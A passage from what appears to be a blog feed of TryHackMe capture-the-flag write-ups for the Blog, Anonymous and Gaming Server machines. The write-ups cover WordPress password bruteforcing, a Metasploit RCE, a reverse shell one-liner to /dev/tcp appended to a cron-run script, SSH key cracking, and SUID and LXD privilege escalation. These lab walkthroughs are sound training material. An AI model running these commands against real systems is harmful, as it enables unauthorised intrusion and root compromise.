[+] Data Sent: 12.476 KB
[+] Data Received: 460.383 KB
[+] Memory used: 112.172 MB
[+] Elapsed time: 00:00:05
</code></pre><p>Got another username: <em>kwheel</em></p>
<p>lets try to bruteforce with thos username with rockyou.</p>
<p><code>wpscan --url http://10.10.129.169 --passwords /usr/share/wordlists/rockyou.txt --usernames kwheel</code></p>
<p>Now we got the username and password.
lets login to the wordpress.</p>
<p>I found a remote code execution module from metaspolit when I searched online.</p>
<p><code>https://www.exploit-db.com/exploits/46511</code></p>
<p>lets try to use it
<figure>
    <img src="/Tryhackme/Blog/4.png"
         alt="Tryhackme: Blog machine - Metasploit Exploit"/> <figcaption>
            <p>Tryhackme: Blog machine - Metasploit Exploit</p>
        </figcaption>
</figure>
</p>
<figure>
    <img src="/Tryhackme/Blog/5.png"
         alt="Tryhackme: Blog machine - Initial Shell Access"/> <figcaption>
            <p>Tryhackme: Blog machine - Initial Shell Access</p>
        </figcaption>
</figure>

<p>Now type <em>shell</em> in metepretor.</p>
<p>Now we got the shell and lets break out the jail shell with the below command.
<code>python -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'</code></p>
<pre><code>www-data@blog:/var/www/wordpress$ whoami
whoami
www-data
</code></pre><pre><code>www-data@blog:/home/bjoel$ ls -la
ls -la
total 100
drwxr-xr-x 4 bjoel bjoel  4096 May 26 20:08 .
drwxr-xr-x 3 root  root   4096 May 26 18:02 ..
lrwxrwxrwx 1 root  root      9 May 26 18:18 .bash_history -&gt; /dev/null
-rw-r--r-- 1 bjoel bjoel   220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 bjoel bjoel  3771 Apr  4  2018 .bashrc
drwx------ 2 bjoel bjoel  4096 May 25 13:15 .cache
drwx------ 3 bjoel bjoel  4096 May 25 13:15 .gnupg
-rw-r--r-- 1 bjoel bjoel   807 Apr  4  2018 .profile
-rw-r--r-- 1 bjoel bjoel     0 May 25 13:16 .sudo_as_admin_successful
-rw-r--r-- 1 bjoel bjoel 69106 May 26 18:33 Billy_Joel_Termination_May20-2020.pdf
-rw-r--r-- 1 bjoel bjoel    57 May 26 20:08 user.txt
www-data@blog:/home/bjoel$ cat user.txt
cat user.txt
You won't find what you're looking for here.

TRY HARDER
</code></pre><p>So, the user flag is not there.</p>
<figure>
    <img src="/Tryhackme/Blog/6.png"
         alt="Tryhackme: Blog machine - SUID Binary List"/> <figcaption>
            <p>Tryhackme: Blog machine - SUID Binary List</p>
        </figcaption>
</figure>

<ol>
<li>In command prompt type: find / -type f -perm -04000 -ls 2&gt;/dev/null</li>
<li>From the output, make note of all the SUID binaries.</li>
</ol>
<p>SO  SUID is set, which means it is possible to get to root using <em>shared object injection</em></p>
<pre><code>www-data@blog:/tmp$ strace /usr/sbin/checker 2&gt;&amp;1 | grep -i -E &quot;open|access|no such file&quot;
&lt;hecker 2&gt;&amp;1 | grep -i -E &quot;open|access|no such file&quot;
access(&quot;/etc/suid-debug&quot;, F_OK)         = -1 ENOENT (No such file or directory)
access(&quot;/etc/suid-debug&quot;, F_OK)         = -1 ENOENT (No such file or directory)
access(&quot;/etc/ld.so.nohwcap&quot;, F_OK)      = -1 ENOENT (No such file or directory)
access(&quot;/etc/ld.so.preload&quot;, R_OK)      = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, &quot;/etc/ld.so.cache&quot;, O_RDONLY|O_CLOEXEC) = 3
access(&quot;/etc/ld.so.nohwcap&quot;, F_OK)      = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, &quot;/lib/x86_64-linux-gnu/libc.so.6&quot;, O_RDONLY|O_CLOEXEC) = 3
</code></pre><pre><code>www-data@blog:/var/www/wordpress$ checker
checker
Not an Admin
</code></pre><figure>
    <img src="/Tryhackme/Blog/7.png"
         alt="Tryhackme: Blog machine - checker binary"/> <figcaption>
            <p>Tryhackme: Blog machine - checker binary</p>
        </figcaption>
</figure>

<p>Now lets. try to assign a value for the env_variable <em>admin</em> to get a shell as root.</p>
<pre><code>www-data@blog:/var/www/wordpress$ export admin=test
export admin=test
www-data@blog:/var/www/wordpress$ checker
checker
root@blog:/var/www/wordpress#id
uid=0(root) gid=33(www-data) groups=33(www-data)
</code></pre><figure>
    <img src="/Tryhackme/Blog/8.png"
         alt="Tryhackme: Blog machine - root.txt"/> <figcaption>
            <p>Tryhackme: Blog machine - root.txt</p>
        </figcaption>
</figure>

<p>Now we got the root flag. then we need to find the user flag.</p>
<p>Use the following command</p>
<pre><code>find / -name &quot;user.txt&quot; 
2&gt;/dev/null
</code></pre><figure>
    <img src="/Tryhackme/Blog/9.png"
         alt="Tryhackme: Blog machine - User.txt"/> <figcaption>
            <p>Tryhackme: Blog machine - User.txt</p>
        </figcaption>
</figure>

<p>And now, we got the user flag</p>
<p>Thanks for reading! Prost! 🍺</p>
<p>If you have any questions: Feel free to contact me.</p>
<p>Twitter Profile: <a href="https://twitter.com/Sh1v4_R4jU">https://twitter.com/Sh1v4_R4jU</a></p>
<p>TryHackMe Profile: <a href="https://tryhackme.com/p/Whiterose">https://tryhackme.com/p/Whiterose</a></p>
<p>HTB Profile: <a href="https://www.hackthebox.eu/home/users/profile/167190">https://www.hackthebox.eu/home/users/profile/167190</a></p>
<p><figure>
    <img src="/HTB_profile.png"
         alt="HTB_Profile"/> 
</figure>

<figure>
    <img src="https://tryhackme-badges.s3.amazonaws.com/Whiterose.png"
         alt="Tryhackme"/> 
</figure>
</p>
]]></content>
        </item>
        
        <item>
            <title>Tryhackme- Anonymous Writeup</title>
            <link>https://0xSh1v4.github.io/posts/2020/09/tryhackme-anonymous-writeup/</link>
            <pubDate>Tue, 01 Sep 2020 00:00:00 +0000</pubDate>
            
            <guid>https://0xSh1v4.github.io/posts/2020/09/tryhackme-anonymous-writeup/</guid>
            <description>The following write up is for the machine: Anonymous
Tryhackme is an online CTF platform where you can hone your penetration testing skills similar to Hackthebox. It’s similar to boot2root machines. The goal is to find two flags namely, the User flag and the Root flag to successfully root the machine. One advantage of using TryHackMe is that you can concentrate on specific areas such as scanning, buffer overflows, privilege escalation which seems to really interesting to improve your skills in those areas.</description>
            <content type="html"><![CDATA[<p>The following write up is for the machine: Anonymous</p>
<p><a href="https://www.tryhackme.com">Tryhackme</a> is an online CTF platform where you can hone your penetration testing skills similar to Hackthebox. It’s similar to boot2root machines. The goal is to find two flags namely, the User flag and the Root flag to successfully root the machine. One advantage of using TryHackMe is that you can concentrate on specific areas such as scanning, buffer overflows, privilege escalation which seems to really interesting to improve your skills in those areas.</p>
<h2 id="synopsis">Synopsis</h2>
<p><a href="https://tryhackme.com/room/anonymous">Anonymous</a> is the typical boot2root machine where we need to find two flags in the machine. It comes with an interesting part that explains the exploitation via FTP server to get the reverse shell by which we can obtain a user flag.And the privilege escalation done via weak SUID permissions by which we will obtain our root flag.</p>
<h2 id="scanning-and-enumeration-of-the-network">Scanning and Enumeration of the network</h2>
<p>As usual, let us run the nmap tool to can the target network.</p>
<pre><code>┌──(zeus㉿Zeus-Master)-[/mnt/d/PenTest/Tryhackme/Anonymous]
└─$ sudo nmap -sC -sV -sS -oA res 10.10.237.45 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-27 17:07 CEST
Nmap scan report for 10.10.237.45
Host is up (0.069s latency).
Not shown: 996 closed ports
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 111      113          4096 Jun 04 19:26 scripts [NSE: writeable]
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.9.90.133
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8b:ca:21:62:1c:2b:23:fa:6b:c6:1f:a8:13:fe:1c:68 (RSA)
|   256 95:89:a4:12:e2:e6:ab:90:5d:45:19:ff:41:5f:74:ce (ECDSA)
|_  256 e1:2a:96:a4:ea:8f:68:8f:cc:74:b8:f0:28:72:70:cd (ED25519)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_nbstat: NetBIOS name: ANONYMOUS, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: anonymous
|   NetBIOS computer name: ANONYMOUS\x00
|   Domain name: \x00
|   FQDN: anonymous
|_  System time: 2020-08-27T15:07:29+00:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-08-27T15:07:29
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.65 seconds
</code></pre><p>From the results, we could see an allowance via anonymous ftp login and also the smb ports are open.</p>
<p>So let&rsquo;s find what infos do we get from there.</p>
<figure>
    <img src="/Tryhackme/Anonymous/1.png"
         alt="Tryhackme: Anonymous machine - Download from FTP server"/> <figcaption>
            <p>Tryhackme: Anonymous machine - Download from FTP server</p>
        </figcaption>
</figure>

<p>Now, we have downloaded these files. lets inspect it.</p>
<p>Now, I have downloaded these files. lets inspect it. (<strong>This is the part which learned from this machine</strong>)
I found a bash script (clean.sh) which runs at regular intervals.
I also ran <em>enum4linux</em> since I found some smb port 139 and 445.</p>
<p>Read this nice article about SMB Enumeration: <a href="https://www.hackingarticles.in/a-little-guide-to-smb-enumeration/">SMB-Enumeration</a></p>
<pre><code>┌──(zeus㉿Zeus-Master)-[/mnt/d/PenTest/Tryhackme/Anonymous]
└─$ enum4linux -a 10.10.237.45                                                                         130 ⨯
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Thu Aug 27 17:22:06 2020

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 10.10.237.45
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ==================================================== 
|    Enumerating Workgroup/Domain on 10.10.237.45    |
 ==================================================== 
[+] Got domain/workgroup name: WORKGROUP

 ============================================ 
|    Nbtstat Information for 10.10.237.45    |
 ============================================ 
Looking up status of 10.10.237.45
	ANONYMOUS       &lt;00&gt; -         B &lt;ACTIVE&gt;  Workstation Service
	ANONYMOUS       &lt;03&gt; -         B &lt;ACTIVE&gt;  Messenger Service
	ANONYMOUS       &lt;20&gt; -         B &lt;ACTIVE&gt;  File Server Service
	..__MSBROWSE__. &lt;01&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Master Browser
	WORKGROUP       &lt;00&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Domain/Workgroup Name
	WORKGROUP       &lt;1d&gt; -         B &lt;ACTIVE&gt;  Master Browser
	WORKGROUP       &lt;1e&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Browser Service Elections

	MAC Address = 00-00-00-00-00-00

 ===================================== 
|    Session Check on 10.10.237.45    |
 ===================================== 
[+] Server 10.10.237.45 allows sessions using username '', password ''

 =========================================== 
|    Getting domain SID for 10.10.237.45    |
 =========================================== 
Domain Name: WORKGROUP
Domain Sid: (NULL SID)
[+] Can't determine if host is part of domain or part of a workgroup

 ====================================== 
|    OS information on 10.10.237.45    |
 ====================================== 
Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.
[+] Got OS info for 10.10.237.45 from smbclient: 
[+] Got OS info for 10.10.237.45 from srvinfo:
	ANONYMOUS      Wk Sv PrQ Unx NT SNT anonymous server (Samba, Ubuntu)
	platform_id     :	500
	os version      :	6.1
	server type     :	0x809a03

 ============================= 
|    Users on 10.10.237.45    |
 ============================= 
index: 0x1 RID: 0x3eb acb: 0x00000010 Account: namelessone	Name: namelessone	Desc: 

user:[namelessone] rid:[0x3eb]

 ========================================= 
|    Share Enumeration on 10.10.237.45    |
 ========================================= 

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	pics            Disk      My SMB Share Directory for Pics
	IPC$            IPC       IPC Service (anonymous server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available

[+] Attempting to map shares on 10.10.237.45
//10.10.237.45/print$	Mapping: DENIED, Listing: N/A
//10.10.237.45/pics	Mapping: OK, Listing: OK
//10.10.237.45/IPC$	[E] Can't understand response:
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*

 ==================================================== 
|    Password Policy Information for 10.10.237.45    |
 ==================================================== 


[+] Attaching to 10.10.237.45 using a NULL share

[+] Trying protocol 139/SMB...

[+] Found domain(s):

	[+] ANONYMOUS
	[+] Builtin

[+] Password Info for Domain: ANONYMOUS

	[+] Minimum password length: 5
	[+] Password history length: None
	[+] Maximum password age: 37 days 6 hours 21 minutes 
	[+] Password Complexity Flags: 000000

		[+] Domain Refuse Password Change: 0
		[+] Domain Password Store Cleartext: 0
		[+] Domain Password Lockout Admins: 0
		[+] Domain Password No Clear Change: 0
		[+] Domain Password No Anon Change: 0
		[+] Domain Password Complex: 0

	[+] Minimum password age: None
	[+] Reset Account Lockout Counter: 30 minutes 
	[+] Locked Account Duration: 30 minutes 
	[+] Account Lockout Threshold: None
	[+] Forced Log off Time: 37 days 6 hours 21 minutes 


[+] Retieved partial password policy with rpcclient:

Password Complexity: Disabled
Minimum Password Length: 5


 ============================== 
|    Groups on 10.10.237.45    |
 ============================== 

[+] Getting builtin groups:

[+] Getting builtin group memberships:

[+] Getting local groups:

[+] Getting local group memberships:

[+] Getting domain groups:

[+] Getting domain group memberships:

 ======================================================================= 
|    Users on 10.10.237.45 via RID cycling (RIDS: 500-550,1000-1050)    |
 ======================================================================= 
[I] Found new SID: S-1-22-1
[I] Found new SID: S-1-5-21-2144577014-3591677122-2188425437
[I] Found new SID: S-1-5-32
[+] Enumerating users using SID S-1-5-32 and logon username '', password ''
S-1-5-32-500 *unknown*\*unknown* (8)
S-1-5-32-501 *unknown*\*unknown* (8)
S-1-5-32-502 *unknown*\*unknown* (8)
S-1-5-32-503 *unknown*\*unknown* (8)
S-1-5-32-504 *unknown*\*unknown* (8)
S-1-5-32-505 *unknown*\*unknown* (8)
S-1-5-32-506 *unknown*\*unknown* (8)
S-1-5-32-507 *unknown*\*unknown* (8)
S-1-5-32-508 *unknown*\*unknown* (8)
S-1-5-32-509 *unknown*\*unknown* (8)
S-1-5-32-510 *unknown*\*unknown* (8)
S-1-5-32-511 *unknown*\*unknown* (8)
S-1-5-32-512 *unknown*\*unknown* (8)
S-1-5-32-544 BUILTIN\Administrators (Local Group)
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)
S-1-5-32-1000 *unknown*\*unknown* (8)
S-1-5-32-1001 *unknown*\*unknown* (8)
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\namelessone (Local User)
[+] Enumerating users using SID S-1-5-21-2144577014-3591677122-2188425437 and logon username '', password ''
S-1-5-21-2144577014-3591677122-2188425437-500 *unknown*\*unknown* (8)
S-1-5-21-2144577014-3591677122-2188425437-501 ANONYMOUS\nobody (Local User)
S-1-5-21-2144577014-3591677122-2188425437-513 ANONYMOUS\None (Domain Group)
S-1-5-21-2144577014-3591677122-2188425437-514 *unknown*\*unknown* (8)
S-1-5-21-2144577014-3591677122-2188425437-515 *unknown*\*unknown* (8)
S-1-5-21-2144577014-3591677122-2188425437-516 *unknown*\*unknown* (8)
S-1-5-21-2144577014-3591677122-2188425437-1001 *unknown*\*unknown* (8)
S-1-5-21-2144577014-3591677122-2188425437-1002 *unknown*\*unknown* (8)
S-1-5-21-2144577014-3591677122-2188425437-1003 ANONYMOUS\namelessone (Local User)
S-1-5-21-2144577014-3591677122-2188425437-1004 *unknown*\*unknown* (8)
S-1-5-21-2144577014-3591677122-2188425437-1005 *unknown*\*unknown* (8)
S-1-5-21-2144577014-3591677122-2188425437-1006 *unknown*\*unknown* (8)
S-1-5-21-2144577014-3591677122-2188425437-1007 *unknown*\*unknown* (8)
S-1-5-21-2144577014-3591677122-2188425437-1008 *unknown*\*unknown* (8)
S-1-5-21-2144577014-3591677122-2188425437-1009 *unknown*\*unknown* (8)
S-1-5-21-2144577014-3591677122-2188425437-1010 *unknown*\*unknown* (8)
S-1-5-21-2144577014-3591677122-2188425437-1011 *unknown*\*unknown* (8)
S-1-5-21-2144577014-3591677122-2188425437-1012 *unknown*\*unknown* (8)
S-1-5-21-2144577014-3591677122-2188425437-1013 *unknown*\*unknown* (8)
S-1-5-21-2144577014-3591677122-2188425437-1014 *unknown*\*unknown* (8)



 ============================================= 
|    Getting printer info for 10.10.237.45    |
 ============================================= 
No printers returned.


enum4linux complete on Thu Aug 27 17:29:05 2020
</code></pre><p>From the results of <em>enum4linux</em>, I found that anonymous smbshare accessiblity is possible. But there were only image files and doesn&rsquo;t help us much.</p>
<figure>
    <img src="/Tryhackme/Anonymous/2.png"
         alt="Tryhackme: Anonymous machine - Download from SMB Share"/> <figcaption>
            <p>Tryhackme: Anonymous machine - Download from SMB Share</p>
        </figcaption>
</figure>

<p>Also, we have found the local users names from <em>enum4linux</em>.</p>
<ul>
<li>ANONYMOUS\nobody</li>
<li>ANONYMOUS\none</li>
<li>ANONYMOUS\namelessone</li>
</ul>
<h2 id="exploitation-of-the-network">Exploitation of the network</h2>
<p>After looking the results again, It striked me that we have a full write permission on clean.sh script which runs repeatedly and it is possible to upload our shell and get an access to the machine.</p>
<p>we have full write permission on clean.sh file.
<figure>
    <img src="/Tryhackme/Anonymous/3.png"
         alt="Tryhackme: Anonymous machine - Append Shell Code to the sh file"/> <figcaption>
            <p>Tryhackme: Anonymous machine - Append Shell Code to the sh file</p>
        </figcaption>
</figure>
</p>
<p>So, we have append our shell script to the file</p>
<p><code>/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.9.90.133/1234 0&gt;&amp;1'</code></p>
<p>And now we got our rev shell back connecting to the target machine.</p>
<figure>
    <img src="/Tryhackme/Anonymous/4.png"
         alt="Tryhackme: Anonymous machine - Low level shell with the user namelessone"/> <figcaption>
            <p>Tryhackme: Anonymous machine - Low level shell with the user namelessone</p>
        </figcaption>
</figure>

<h2 id="privilege-escalation">Privilege Escalation</h2>
<p>Now, we have logged in as namelessone user.</p>
<p>Lets see what SUID permission does this user have</p>
<pre><code>namelessone@anonymous:~$ find / -perm -u=s -type f 2&gt;/dev/null
find / -perm -u=s -type f 2&gt;/dev/null
/snap/core/8268/bin/mount
/snap/core/8268/bin/ping
/snap/core/8268/bin/ping6
/snap/core/8268/bin/su
/bin/umount
/bin/fusermount
/bin/ping
/bin/mount
/bin/su
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/bin/passwd
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">/usr/bin/env</code></pre></div>
/usr/bin/gpasswd
/usr/bin/newuidmap
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/newgidmap
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/traceroute6.iputils
/usr/bin/at
</code></pre><p>The user namelessone has the <strong>ENV</strong> with <em>SUID</em> bit set.</p>
<p>So. we can use it to elevate our privilege
<a href="https://gtfobins.github.io/gtfobins/env/">GTFOBINS-ENV</a></p>
<figure>
    <img src="/Tryhackme/Anonymous/5.png"
         alt="Tryhackme: Anonymous machine - Privilege Escalation to Root"/> <figcaption>
            <p>Tryhackme: Anonymous machine - Privilege Escalation to Root</p>
        </figcaption>
</figure>

<p>And that&rsquo;s how we have got our root flag.</p>
<p>Thanks for reading! Prost! 🍺</p>
<p>If you have any questions: Feel free to contact me.</p>
<p>Twitter Profile: <a href="https://twitter.com/Sh1v4_R4jU">https://twitter.com/Sh1v4_R4jU</a></p>
<p>TryHackMe Profile: <a href="https://tryhackme.com/p/Whiterose">https://tryhackme.com/p/Whiterose</a></p>
<p>HTB Profile: <a href="https://www.hackthebox.eu/home/users/profile/167190">https://www.hackthebox.eu/home/users/profile/167190</a></p>
<p><figure>
    <img src="/HTB_profile.png"
         alt="HTB_Profile"/> 
</figure>

<figure>
    <img src="https://tryhackme-badges.s3.amazonaws.com/Whiterose.png"
         alt="Tryhackme"/> 
</figure>
</p>
]]></content>
        </item>
        
        <item>
            <title>Tryhackme- Gaming Server Writeup</title>
            <link>https://0xSh1v4.github.io/posts/2020/09/tryhackme-gaming-server-writeup/</link>
            <pubDate>Tue, 01 Sep 2020 00:00:00 +0000</pubDate>
            
            <guid>https://0xSh1v4.github.io/posts/2020/09/tryhackme-gaming-server-writeup/</guid>
            <description>The following write up is for the machine: Gaming-Server
Tryhackme is an online CTF platform where you can hone your penetration testing skills similar to Hackthebox. It’s similar to boot2root machines. The goal is to find two flags namely, the User flag and the Root flag to successfully root the machine. One advantage of using TryHackMe is that you can concentrate on specific areas such as scanning, buffer overflows, privilege escalation which seems to really interesting to improve your skills in those areas.</description>
            <content type="html"><![CDATA[<p>The following write up is for the machine: Gaming-Server</p>
<p><a href="https://www.tryhackme.com">Tryhackme</a> is an online CTF platform where you can hone your penetration testing skills similar to Hackthebox. It’s similar to boot2root machines. The goal is to find two flags namely, the User flag and the Root flag to successfully root the machine. One advantage of using TryHackMe is that you can concentrate on specific areas such as scanning, buffer overflows, privilege escalation which seems to really interesting to improve your skills in those areas.</p>
<h2 id="synopsis">Synopsis</h2>
<p><a href="https://tryhackme.com/room/gamingserver">Gaming-Server</a> is the typical boot2root machine where we need to find two flags in the machine namely user.txt and root.flag.</p>
<h3 id="for-user-flag">For User Flag:</h3>
<p>We need to find the private key and username which was hidden in the application and then we crack the ssh key and find the passphrase and we get into the user flag.</p>
<h3 id="for-root-flag">For Root Flag:</h3>
<p>This is something new for me and took sometime to figure it out and now I&rsquo;ve learned <em>Lxd/LxC</em> privilege  exploitation technique. To find the root flag, we need to exploit the features of lxc/lxd and escalate to the root.</p>
<h2 id="scanning-and-enumeration-of-the-network">Scanning and Enumeration of the network</h2>
<p>Asusual, let us run the nmap tool to can the target network.</p>
<pre><code>┌──(zeus㉿Zeus-Master)-[/mnt/d/PenTest/Tryhackme/gamingserver]
└─$ nmap -sC -sV -oA top 10.10.67.59
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-02 19:45 CEST
Nmap scan report for 10.10.67.59
Host is up (0.042s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 34:0e:fe:06:12:67:3e:a4:eb:acb:7a:c4:81:6d:fe:a9 (RSA)
|   256 49:61:1e:f4:52:6e:7b:29:98:db:30:2d:16:ed:f4:8b (ECDSA)
|_  256 b8:60:c4:5b:b7:b2:d0:23:a0:c7:56:59:5c:63:1e:c4 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: House of danak
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.04 seconds
</code></pre><p>In the index.html page, source code. we have the username
<figure>
    <img src="/Tryhackme/GamingServer/8.png"
         alt="Tryhackme: GamingServer machine - Username in Index.html"/> <figcaption>
            <p>Tryhackme: GamingServer machine - Username in Index.html</p>
        </figcaption>
</figure>
</p>
<h3 id="dirb-results">Dirb Results:</h3>
<pre><code>┌──(zeus㉿Zeus-Master)-[/mnt/d/PenTest/Tryhackme/gamingserver]
└─$ dirb http://10.10.67.59  

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Wed Sep  2 19:43:42 2020
URL_BASE: http://10.10.67.59/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.10.67.59/ ----
+ http://10.10.67.59/index.html (CODE:200|SIZE:2762)                                                                                                                                                                                         
+ http://10.10.67.59/robots.txt (CODE:200|SIZE:33)                                                                                                                                                                                           
==&gt; DIRECTORY: http://10.10.67.59/secret/                                                                                                                                                                                                    
+ http://10.10.67.59/server-status (CODE:403|SIZE:276)                                                                                                                                                                                       
==&gt; DIRECTORY: http://10.10.67.59/uploads/                                                                                                                                                                                                   
                                                                                                                                                                                                                                             
---- Entering directory: http://10.10.67.59/secret/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                                                                                             
---- Entering directory: http://10.10.67.59/uploads/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
-----------------
END_TIME: Wed Sep  2 19:47:22 2020
</code></pre><p>There is /secret interesting folder and we could see that there is a key.</p>
<figure>
    <img src="/Tryhackme/GamingServer/3.png"
         alt="Tryhackme: GamingServer machine -/secret/ path"/> <figcaption>
            <p>Tryhackme: GamingServer machine -/secret/ path</p>
        </figcaption>
</figure>

<p>lets download the key and examine it.</p>
<p><figure>
    <img src="/Tryhackme/GamingServer/4.png"
         alt="Tryhackme: GamingServer machine - SSH Private Key"/> <figcaption>
            <p>Tryhackme: GamingServer machine - SSH Private Key</p>
        </figcaption>
</figure>

It is RSA private key.</p>
<p>Then, we checked the /robots directory.
<figure>
    <img src="/Tryhackme/GamingServer/1.png"
         alt="Tryhackme: GamingServer machine - robots.txt"/> <figcaption>
            <p>Tryhackme: GamingServer machine - robots.txt</p>
        </figcaption>
</figure>
</p>
<p>Now we see that, we could go to /uploads path.</p>
<figure>
    <img src="/Tryhackme/GamingServer/2.png"
         alt="Tryhackme: GamingServer machine - Uploads Folder"/> <figcaption>
            <p>Tryhackme: GamingServer machine - Uploads Folder</p>
        </figcaption>
</figure>

<p>there is a dict.lst seems like a dictonary which we could use to bruteforce the ssh keys.
<figure>
    <img src="/Tryhackme/GamingServer/5.png"
         alt="Tryhackme: GamingServer machine -Dict.lst file"/> <figcaption>
            <p>Tryhackme: GamingServer machine -Dict.lst file</p>
        </figcaption>
</figure>
</p>
<h2 id="exploitation-of-the-network">Exploitation of the network</h2>
<p>Now, lets try to find the password for the ssh key by sending it to ssh2john and then bruteforce it with the dict.lst which we obtained.</p>
<pre><code>┌──(zeus㉿Zeus-Master)-[/mnt/d/PenTest/Tryhackme/gamingserver]
└─$ /usr/share/john/ssh2john.py ~/.ssh/secretKey &gt; decrpyted_key
</code></pre><p>Now, lets send it to john to decrypt to get our passphrase.
<figure>
    <img src="/Tryhackme/GamingServer/7.png"
         alt="Tryhackme: GamingServer machine - john ssh password"/> <figcaption>
            <p>Tryhackme: GamingServer machine - john ssh password</p>
        </figcaption>
</figure>
</p>
<p>now, we have username and password. lets ssh into the server and we got in now.
<figure>
    <img src="/Tryhackme/GamingServer/9.png"
         alt="Tryhackme: GamingServer machine - ssh into john"/> <figcaption>
            <p>Tryhackme: GamingServer machine - ssh into john</p>
        </figcaption>
</figure>
</p>
<h2 id="privilege-escalation">Privilege Escalation</h2>
<p>Once we have obtained the user flag. now we need to escalate the root level privilege.</p>
<p>After examining, we found that this user is a part of LXD (Linux daemon) group.</p>
<figure>
    <img src="/Tryhackme/GamingServer/10.png"
         alt="Tryhackme: GamingServer machine - LXD group"/> <figcaption>
            <p>Tryhackme: GamingServer machine - LXD group</p>
        </figcaption>
</figure>

<p>&ldquo;A member of the local “lxd” group can instantly escalate the privileges to root on the host operating system. This is irrespective of whether that user has been granted sudo rights and does not require them to enter their password. The vulnerability exists even with the LXD snap package.</p>
<p>LXD is a root process that carries out actions for anyone with write access to the LXD UNIX socket. It often does not attempt to match the privileges of the calling user. There are multiple methods to exploit this.</p>
<p>One of them is to use the LXD API to mount the host’s root filesystem into a container. This gives a low-privilege user root access to the host filesystem. &quot;</p>
<p>I have found this nice guide which we could use it.
<a href="https://www.hackingarticles.in/lxd-privilege-escalation/">LXD Privilege Escalation</a></p>
<p>We clone this lxd-alpine-builder by running the below command:</p>
<pre><code>git clone https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
./build-alpine
</code></pre><p>On running the above command, we get a tar.gz file which we transfer to our target machine and then follow the below steps.</p>
<pre><code>john@exploitable:/tmp$ lxc image import ./alpine-v3.12-x86_64-20200902_2135.tar.gz --alias myimage
Image imported with fingerprint: bd9262e6c27958294c95902aa18d2e0b7189b170e71c3b16d5986de3ea19e8
john@exploitable:/tmp$ lxc image list
+---------+--------------+--------+-------------------------------+--------+--------+-----------------------------+
